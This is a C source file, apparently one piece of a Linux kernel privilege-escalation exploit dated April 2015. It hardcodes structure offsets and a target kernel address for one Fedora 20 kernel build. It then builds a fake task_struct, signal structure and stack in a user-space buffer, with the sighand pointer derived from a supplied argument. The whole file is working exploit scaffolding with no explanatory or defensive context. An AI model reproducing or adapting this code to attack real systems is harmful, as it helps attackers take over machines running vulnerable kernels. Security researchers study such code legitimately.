/*
 * Keeps kernel offstes and uses it to create internal data structures.
 * It's critical from the kernel perspective, so it does take into
 * account padding, reoredring, optimalization and many others done
 * at the time when kernel compiles own structures / data.
 *
 * April 2015
 * Adam 'pi3' Zabrocki
 */

#define MAX_TARGETS 1    // Currently not many ;)

struct p_offsets {

   char *p_name;

   unsigned long task_struct_size;
   unsigned long task_struct_offset_stack;
   unsigned long task_struct_offset_sighand;
   unsigned long task_struct_offset_blocked;
   unsigned long task_struct_offset_jobctl;
   unsigned long task_struct_offset_pending;
   unsigned long task_struct_offset_signal;
   unsigned long task_struct_offset_ptrace;

   unsigned long signal_struct_size;
   unsigned long sighand_struct_offset_action;
   unsigned long sigaction_offset_sa_add_handler;

   unsigned long ts_blocked_size;
   unsigned long ts_pending_size;
   unsigned long stack_size;

   unsigned long proc_root_subdir;  // target

} p_off[MAX_TARGETS] = {

   {
      "3.11.10-301.fc20.x86_64",
      0x798,    // task_struct size
      0x8,
      0x498,
      0x4a0,
      0x1e8,
      0x4b8,
      0x490,
      0x18,

      0x430,    // signal_struct size
      0x148,
      0x148,

      0x8,
      0x18,
      0x4000,   // 4 pages...

      0xffffffff81c6fc80ULL     // our target address
   }

};

extern unsigned char p_opt; // just one target for now...

char huge_buffer[0x4000*8];  // 32 pages == 128KB
extern char *thread_info;

/*
 * !!! DO NOT MODIFY THE BUFFER ORDER !!!
 *
 * In fact the best would be if you keep your
 * dirty hands off from this code ;p
 */
void *mktaskstruct(unsigned long p_arg) {

   char *p_task_struct;
   char *p_signal_struct;
   char *p_stack;

   /* always 4 pages offset - just in case */
   p_stack = 0x4000 + &huge_buffer[0];
   p_task_struct = p_stack + p_off[p_opt].stack_size;
   p_signal_struct = p_task_struct + p_off[p_opt].task_struct_size;

   /* Because:
    *
    * 0xffffffff8164b47b <+43>:    mov    %gs:0xc770,%rcx
    * 0xffffffff8164b484 <+52>:    sub    $0x1fd8,%rcx
    */
   thread_info = p_stack - 0x2000;

/*
   // task_struct
   if ( (p_task_struct = (char *)malloc(p_off[p_opt].task_struct_size)) == NULL) {
      perror("ERROR! malloc() for p_task_struct => ");
      exit(-1);
   }

   // signal_struct
   if ( (p_signal_struct = (char *)malloc(p_off[p_opt].signal_struct_size)) == NULL) {
      perror("ERROR! malloc() for p_signal_struct => ");
      exit(-1);
   }

   // stack
   if ( (p_stack = (char *)malloc(p_off[p_opt].stack_size)) == NULL) {
      perror("ERROR! malloc() for stack_size => ");
      exit(-1);
   }
*/

   memset(p_task_struct, 0xaa, p_off[p_opt].task_struct_size);
   memset(p_signal_struct, 0, p_off[p_opt].signal_struct_size);
   memset(p_stack, 0 , p_off[p_opt].stack_size);

   // pointer
   *(long *)(p_task_struct + p_off[p_opt].task_struct_offset_stack) =
                 (long)p_stack + 8192; // 2 pages - in the middle

   // pointer
   *(long *)(p_task_struct + p_off[p_opt].task_struct_offset_sighand) =
                 p_arg - (long)p_off[p_opt].sigaction_offset_sa_add_handler;

   // struct sigset_t
   memset(p_task_struct + p_off[p_opt].task_struct_offset_blocked,
         0xFF,
         p_off[p_opt].ts_blocked_size);

   // int
   *(int *)(p_task_struct + p_off[p_opt].task_struct_offset_jobctl) = 0x0;

   // struct sigpending
   memset(p_task_struct + p_off[p_opt].task_struct_offset_pending,
         0xFF,
         p_off[p_opt].ts_pending_size);

   // pointer
   *(long *)(p_task_struct + p_off[p_opt].task_struct_offset_signal) =
                 (long)p_signal_struct;

   // int
   *(int *)(p_task_struct + p_off[p_opt].task_struct_offset_ptrace) = 0x1;

   return p_task_struct;
}
